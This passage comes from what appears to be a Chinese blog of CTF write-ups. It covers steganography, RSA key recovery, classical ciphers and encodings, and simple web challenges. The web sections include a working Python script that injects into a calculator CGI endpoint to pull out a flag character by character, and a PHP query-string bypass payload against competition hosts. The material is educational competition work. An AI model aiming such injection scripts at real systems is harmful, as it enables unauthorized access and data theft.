class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(v1, v2, op, s)</span>:</span></span><br><span class="line">    u = <span class="string">"http://54.223.83.192:8888/cgi-bin/calculate.py?"</span></span><br><span class="line">    payload = dict(value1=v1, value2=v2, op=op, source=s,t=hh)</span><br><span class="line">    <span class="comment">#print payload</span></span><br><span class="line">    r = requests.get(u, params=payload)</span><br><span class="line">    <span class="comment">#print r.url</span></span><br><span class="line">    res = re.findall(<span class="string">"&lt;pre&gt;\n&gt;&gt;&gt;&gt;([\s\S]*)\n&gt;&gt;&gt; &lt;\/pre&gt;"</span>,</span><br><span class="line">                     r.content)[<span class="number">0</span>].split(<span class="string">'\n'</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">assert</span> (res != <span class="string">'Invalid'</span>)</span><br><span class="line">    <span class="keyword">return</span> res == <span class="string">'True'</span></span><br><span class="line">    <span class="comment"># print r.content</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(mid)</span>:</span></span><br><span class="line">    s = flag + chr(mid)</span><br><span class="line">    <span class="keyword">return</span> calc(v1, v2, op, s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin_search</span><span class="params">(seq=xrange<span class="params">(<span class="number">0x20</span>, <span class="number">0x80</span>)</span>, lo=<span class="number">0</span>, hi=None)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> (lo &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> hi == <span class="keyword">None</span>: hi = len(seq)</span><br><span class="line">    <span class="keyword">while</span> lo &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        <span class="comment"># print lo, mid, hi, "\t",</span></span><br><span class="line">        <span class="keyword">if</span> check(seq[mid]): hi = mid</span><br><span class="line">        <span class="keyword">else</span>: lo = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> seq[lo]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">v1, v2, op, s ,hh= <span class="string">'x'</span>, <span class="string">"+FLAG&lt;value1+source#"</span>, <span class="string">"+'"</span>, <span class="string">''</span>,<span class="string">"1a69aa60224a7095ececda5c7c6834fc"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    flag += chr(bin_search() - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>参考：<a href="https://xz.aliyun.com/t/2456" target="_blank" rel="noopener">https://xz.aliyun.com/t/2456</a></p><h2 id="网鼎杯wp"><a href="#网鼎杯wp" class="headerlink" title="网鼎杯wp"></a>网鼎杯wp</h2><h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h2><p>打开文件看见很多图片,首先判断lsb,用工具zsteg,一张一张试，试到第六张<code>zsteg 6.png</code><br>出flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">imagedata           .. text: &quot;-+,554$&amp;&amp;&quot;</span><br><span class="line">b1,rgb,lsb,xy       .. text: &quot;^;lI;bN$&quot;</span><br><span class="line">b1,bgr,lsb,xy       .. text: &quot;+flag&#123;03a253f5-8e93-4533-bcfc-af908830095d&#125;\nq&quot;</span><br><span class="line">b2,b,msb,xy         .. file: Encore - version 8432</span><br><span class="line">b4,r,lsb,xy         .. text: &quot;iEsx\&quot;gwN)&quot;</span><br><span class="line">b4,g,lsb,xy         .. text: &quot;yEsx\&quot;gwN)&quot;</span><br><span class="line">b4,b,msb,xy         .. text: &quot;&#123;OL?i9Ww&quot;</span><br></pre></td></tr></table></figure></p><h3 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h3><p>首先求出q,p<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">   <span class="keyword">if</span> a &lt; b:</span><br><span class="line">     a, b = b, a</span><br><span class="line">   <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">     temp = a % b</span><br><span class="line">     a = b</span><br><span class="line">     b = temp</span><br><span class="line">   <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpq</span><span class="params">(n,e,d)</span>:</span></span><br><span class="line">  p = <span class="number">1</span></span><br><span class="line">  q = <span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> p==<span class="number">1</span> <span class="keyword">and</span> q==<span class="number">1</span>:</span><br><span class="line">    k = d * e - <span class="number">1</span></span><br><span class="line">    g = random.randint ( <span class="number">0</span> , n )</span><br><span class="line">    <span class="keyword">while</span> p==<span class="number">1</span> <span class="keyword">and</span> q==<span class="number">1</span> <span class="keyword">and</span> k % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">      k /= <span class="number">2</span></span><br><span class="line">      y = pow(g,k,n)</span><br><span class="line">      <span class="keyword">if</span> y!=<span class="number">1</span> <span class="keyword">and</span> gcd(y<span class="number">-1</span>,n)&gt;<span class="number">1</span>:</span><br><span class="line">        p = gcd(y<span class="number">-1</span>,n)</span><br><span class="line">        q = n/p</span><br><span class="line">  <span class="keyword">return</span> p,q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">  n =<span class="number">365848589691553391654453815696801609393691558975114732077589431735072735814004481321693204054611153742844719038444697593327493027785795731389621927670788503335861977736740530534583572225955976966446771693720421426616666151538067479984725761741317847115913974275314572559550814811157603376899910638368755166255776849626761808720772583206050387900451906315871548607212450421821284358760939660687558588799753487824506759639032283177034815892289194765173975342074810666614953387403646634191147782168926568900983361174986224868620163303631776464544385042160475855173792780028858673004579549168611488908206940265042017827224145445864849990033230038346962998044409425059655414595541354712964867076540952852074402602485254837693009606256646491881886402251519107628767780560029195077356603998621239496833842620813594476086809217145741837067697701029006079475655230057641122885601163764359304119539318186498359110652713132230601632984636292710845264886583673643096710521658506038045125724977714211793704349604343253187208130136333839351343850952892593409667791896415744436543839302830842902421646274217466522255794836216649020356914498443158290307092169834254304137975684324590877396301465368942446331758175055737212871262544202124864201404357</span></span><br><span class="line">  e = <span class="number">65537</span></span><br><span class="line">  d = <span class="number">171667543985758425014232627985840717336387122108163758500542139626729279212540485673813409388397427405892256280730752710530037468765259171638824687119216443453078833931370749271396524300663719786871097595637432285751800013612137436020725492852419342272435212733486026753609513054804440530485467017884797272879406284689903095072725307517165288748564887361729738358011463377509622604034612759898436024272853796444439505507110804160400608180412245257162062494766079887998276493727771202445125297118556385657613871902180087388189988280105656191733965985878495407148701887047735812018200868151321246119065258205755102189932618492331181731032930671506379119003614308043854723142913145153824556828017544028126772950732350030371733003652817854070184981540813302478821473998511699291112000260313162924676245915026226201977284465842505256191235822318812659628683043195357384607192367037650400361829016395922074065034014120534209020328864830006606839179592932609256661738193663329776230050481312159600570791315455079679469956882283489829258240404557309270261381865785081719442470884775430068193960751589033994677379472095235901602941733635505402949964622214247924792042997962235246007680923289071880896909708764598890244005005286926994431628289</span></span><br><span class="line">  p,q = getpq(n,e,d)</span><br><span class="line">  <span class="keyword">print</span> hex(p),hex(q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure></p><p>然后将enc保存起来为en文件<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">n = <span class="number">365848589691553391654453815696801609393691558975114732077589431735072735814004481321693204054611153742844719038444697593327493027785795731389621927670788503335861977736740530534583572225955976966446771693720421426616666151538067479984725761741317847115913974275314572559550814811157603376899910638368755166255776849626761808720772583206050387900451906315871548607212450421821284358760939660687558588799753487824506759639032283177034815892289194765173975342074810666614953387403646634191147782168926568900983361174986224868620163303631776464544385042160475855173792780028858673004579549168611488908206940265042017827224145445864849990033230038346962998044409425059655414595541354712964867076540952852074402602485254837693009606256646491881886402251519107628767780560029195077356603998621239496833842620813594476086809217145741837067697701029006079475655230057641122885601163764359304119539318186498359110652713132230601632984636292710845264886583673643096710521658506038045125724977714211793704349604343253187208130136333839351343850952892593409667791896415744436543839302830842902421646274217466522255794836216649020356914498443158290307092169834254304137975684324590877396301465368942446331758175055737212871262544202124864201404357</span></span><br><span class="line">q = <span class="number">21247215740957134093265550307601596334565934182288901633479787419858595507309542143291010899116196305518233534420568241312971809880837699847400521241640799368655041150575554308730271881769239094444859039192040949365669348829967204647597799647400611871600471392643211141324508902013965629910849583588860496396894218207070653018491227851599590460886901861118814380124225957234489558977546955544744088926474539812805322440263336981775000388601318263891815294818558967365443417213622344902893006222500539208416032217024199412011407065597780149434489493090516057515224711817526865207811206081845018578244352022299726352429</span></span><br><span class="line">p = <span class="number">17218660277747658661570321204242764803630206984608091050735513899954607259990197682920217962729554631925287717895042750367376053893825222669682720379767777978420372647078471394057423219108293122309702127813213538098587207320396013417905225613995163882055903136983578393368677405597005083234898687252223168153402377438770956193242614092327835450469896527227274247481162714635222596608814392174415700802919488373733075163465872659516094599061925501245246745540660613671330140533678955280470168225630164182057506377339944396256899408381867150087697255700045339651723565686838745271371156317781031620433061297464511939833</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = int(gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>)))</span><br><span class="line">c = <span class="number">595907910014897566676759273220494180110504405309206928262077375196851872198255475894354731091152236001815566589109149418500941957601976338444865345923284445575231525767013366811625019790193104404700935059348406110259409132999154793422284855871479573037198863168316139619015230842153164456415165712733168847053549666987429231550045602429647190887296150436097504253951033086041023290243394588112378415597355331197477353268041702315544498517593435582803377846605416492328428549762726997373778610297631262936044023082133389527010183648204602019909093544050106545010340111158865651714595416550877266379460461202508425081538939755155981052462387069127219471271252329219741973931444515475042747296537826297597609877185091023146800772255931184176842795811493106605043628420424570356086529035683658247137732622727936360278626896359520245649007121507751791963774871011757969835056581831379451191486773951068884218824708768124265822406883125206366165049254095060850508149142077001002691653724105471247840338330950732651135526020758912039445132132220384552395727000975811496722746325764235912590648009260905626046623587310131509221213855320504560598181447448347942432104726593025899197575968063366667049857458434444589861188997071804152577554008432377364384618217386050104523193905875708680446628674323881765587061198043253617150813946435891423000351453751011920626958050766691194569988935791651947014346084202733308461380228052483711867634858130530821103064974133728497007084932069068016812055942718671316269862791929104093268433719717198448532384887239504852113742140342891243245503616771575963935904547388496016245046067614357190925132118951805544371988522892491794366705168091658</span></span><br><span class="line">privatekey = rsa.PrivateKey(n,e,d,p,q)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"en"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(rsa.decrypt(base64.b64decode(f.read()),privatekey).decode())</span><br></pre></td></tr></table></figure></p><p>得到flag<br><code>flag{w3lC0M3_t0_rS4_w0RlD}</code></p><h2 id="安恒-奇怪的恐龙特性"><a href="#安恒-奇怪的恐龙特性" class="headerlink" title="安恒_奇怪的恐龙特性"></a>安恒_奇怪的恐龙特性</h2><p><a href="http://101.71.29.5:10009" target="_blank" rel="noopener">http://101.71.29.5:10009</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">'A_A'</span>])?$_GET[<span class="string">'A_A'</span>]:<span class="string">'A_A'</span>;</span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"A_A"</span>) !==<span class="keyword">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,have fun'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> A_A,too small</span><br></pre></td></tr></table></figure></p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/aaa/?p=222 (附带查询)</span><br><span class="line">结果：</span><br><span class="line">$_SERVER[&apos;QUERY_STRING&apos;] = &quot;p=222&quot;;</span><br><span class="line">$_SERVER[&apos;REQUEST_URI&apos;]  = &quot;/aaa/?p=222&quot;;</span><br><span class="line">$_SERVER[&apos;SCRIPT_NAME&apos;]  = &quot;/aaa/index.php&quot;;</span><br><span class="line">$_SERVER[&apos;PHP_SELF&apos;]     = &quot;/aaa/index.php&quot;;</span><br></pre></td></tr></table></figure><p>简单点解释就是当代码中存在<code>$_REQUEST[&#39;user_id&#39;]</code>里面类似的参数的时候，我们在url上可以这样<code>a.php?user.id</code>传参去进行绕过,这样进去之后也能表示<code>$_REQUEST[&#39;user_id&#39;]</code>的值，同样可以绕过的符号还有<code>+，[</code> 等，应该说是php的一个小特性，上面讲的很清楚了，</p><p>payload：<code>http://101.71.29.5:10007/?A+A[]=admin</code></p><h2 id="loli"><a href="#loli" class="headerlink" title="loli"></a>loli</h2><p>想到使用0xFF异或整个文件，脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'./1.png'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f, open(<span class="string">'xor.png'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> wf:</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> f.read():</span><br><span class="line">            wf.write(chr(ord(each) ^ <span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    xor()</span><br></pre></td></tr></table></figure></p><h2 id="play-fair加密-关键字公平"><a href="#play-fair加密-关键字公平" class="headerlink" title="play fair加密(关键字公平)"></a>play fair加密(关键字公平)</h2><p><a href="http://www.practicalcryptography.com/ciphers/classical-era/playfair/" target="_blank" rel="noopener">http://www.practicalcryptography.com/ciphers/classical-era/playfair/</a></p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><blockquote><p>vv公司称，他们给出了最为公平的游戏规则，你能猜到是什么吗？ 规则：FMGKYBXTSFBNCQDSPT，附件：ZKLIPOAGSUMDWFHCBVTRYENXQ. 答案的格式是key{xxxxx}，xxx为解密内容大写，所以答案是</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># python3</span><br><span class="line"># 在所在pycipher模块下导入</span><br><span class="line">&gt;&gt;&gt; from pycipher import Playfair</span><br><span class="line"> &gt;&gt;&gt; Playfair(&apos;ZKLIPOAGSUMDWFHCBVTRYENXQ&apos;).decipher(&apos;FMGKYBXTSFBNCQDSPT&apos;) &apos;WHALECTFISVERYFAIR&apos;</span><br></pre></td></tr></table></figure><h2 id="rfc4042"><a href="#rfc4042" class="headerlink" title="rfc4042"></a>rfc4042</h2><p>utf-9编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># python2</span><br><span class="line">import utf9</span><br><span class="line">f1 = open(&apos;flag_is_here_rfc4042&apos;,&apos;r&apos;)</span><br><span class="line">f2 = open(&apos;flag.txt&apos;,&apos;w&apos;)</span><br><span class="line">str1 = f1.read()</span><br><span class="line">print utf9.utf9decode(str1)</span><br><span class="line">f2.write(utf9.utf9decode(str1))</span><br><span class="line">f1.close()</span><br><span class="line">f2.close()</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_____*((__//__+___+______-____%____)**((___%(___-_))+________+(___%___+_____+_______%__+______-(______//(_____%___)))))+__*(((________/__)+___%__+_______-(________//____))**(_*(_____+_____)+_______+_________%___))+________*(((_________//__+________%__)+(_______-_))**((___+_______)+_________-(______//__)))+_______*((___+_________-(______//___-_______%__%_))**(_____+_____+_____))+__*(__+_________-(___//___-_________%_____%__))**(_________-____+_______)+(___+_______)**(________%___%__+_____+______)+(_____-__)*((____//____-_____%____%_)+_________)**(_____-(_______//_______+_________%___)+______)+(_____+(_________%_______)*__+_)**_________+_______*(((_________%_______)*__+_______-(________//________))**_______)+(________/__)*(((____-_+_______)*(______+____))**___)+___*((__+_________-_)**_____)+___*(((___+_______-______/___+__-_________%_____%__)*(___-_+________/__+_________%_____))**__)+(_//_)*(((________%___%__+_____+_____)%______)+_______-_)**___+_____*((______/(_____%___))+_______)*((_________%_______)*__+_____+_)+___//___+_________+_________/___</span><br></pre></td></tr></table></figure></p><p>使用脚本解密<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">_ = <span class="number">1</span></span><br><span class="line">__ = <span class="number">2</span></span><br><span class="line">___ = <span class="number">3</span></span><br><span class="line">____ = <span class="number">4</span></span><br><span class="line">_____ = <span class="number">5</span></span><br><span class="line">______ = <span class="number">6</span></span><br><span class="line">_______ = <span class="number">7</span></span><br><span class="line">________ = <span class="number">8</span></span><br><span class="line">_________ = <span class="number">9</span></span><br><span class="line">f = open(<span class="string">'flag.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">a = f.read()</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure></p><p>得到一串数字<code>5287002131074331513</code><br>转换成16进制为<code>495f346d2d6b3379</code><br>转换成字符串就是最后的<code>flagI_4m-k3y</code></p><p>python中16进制转ascii代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="comment">#16进制整数转ASCii编码字符串</span></span><br><span class="line">a = <span class="number">0x665554</span></span><br><span class="line">b = hex(a)  <span class="comment">#转换成相同的字符串即'0x665554'</span></span><br><span class="line">b = b[<span class="number">2</span>:]   <span class="comment">#截取掉'0x'</span></span><br><span class="line">c = binascii.a2b_hex(b) <span class="comment">#转换成ASCii编码的字符串</span></span><br></pre></td></tr></table></figure></p><p>这里我们使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [2]: import binascii</span><br><span class="line">In [3]: a = &apos;495f346d2d6b3379&apos;</span><br><span class="line">In [4]: print(binascii.a2b_hex(a))</span><br><span class="line">I_4m-k3y</span><br></pre></td></tr></table></figure></p><p>ASCii编码字符串转十六进制整数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">c = <span class="string">'fUT'</span></span><br><span class="line">e = <span class="number">0</span>   <span class="comment">#暂存结果</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    d = ord(i)  <span class="comment">#单个字符转换成ASCii码</span></span><br><span class="line">    e = e*<span class="number">256</span> + d   <span class="comment">#将单个字符转换成的ASCii码相连</span></span><br><span class="line">print(<span class="string">"e:%x"</span> %e)</span><br><span class="line"><span class="keyword">print</span> type(e)</span><br></pre></td></tr></table></figure></p><h2 id="kill-2016全国大学生信息安全竞赛"><a href="#kill-2016全国大学生信息安全竞赛" class="headerlink" title="kill(2016全国大学生信息安全竞赛)"></a>kill(2016全国大学生信息安全竞赛)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">threst@threst:~/下载$ strings kill.pcapng | grep flag</span><br><span class="line">=flag&#123;roses_r_blue_violets_r_r3d_mayb3_harambae_is_not_kill&#125;</span><br></pre></td></tr></table></figure><h2 id="2018“安恒杯”Web安全测试大赛（秋季预选赛）"><a href="#2018“安恒杯”Web安全测试大赛（秋季预选赛）" class="headerlink" title="2018“安恒杯”Web安全测试大赛（秋季预选赛）"></a>2018“安恒杯”Web安全测试大赛（秋季预选赛）</h2><h4 id="输入试试"><a href="#输入试试" class="headerlink" title="输入试试"></a>输入试试</h4><p><a href="http://114.55.36.69:8003" target="_blank" rel="noopener">http://114.55.36.69:8003</a><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Input<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"flag"</span> <span class="attr">style</span>=<span class="string">"width: 200px;margin-left: 100px;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">"check();"</span> <span class="attr">value</span>=<span class="string">"提交"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> flag = <span class="built_in">document</span>.getElementById(<span class="string">"flag"</span>).value;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> str = <span class="string">"d84d9657e5e5e"</span> || <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> str = str + (<span class="string">"ad2ad3fe"</span> &amp;&amp; <span class="number">2</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> str = str + <span class="string">"a2da9494b8"</span> + <span class="string">"ddea4fd4"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> str = str.split(<span class="string">""</span>).reverse().join(<span class="string">""</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (str == flag)&#123;</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">"恭喜你已经找到flag！"</span>);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>直接控制台<br>flag:<code>4df4aedd8b4949ad2a2e5e5e7569d48d</code></p><h2 id="简单的md5"><a href="#简单的md5" 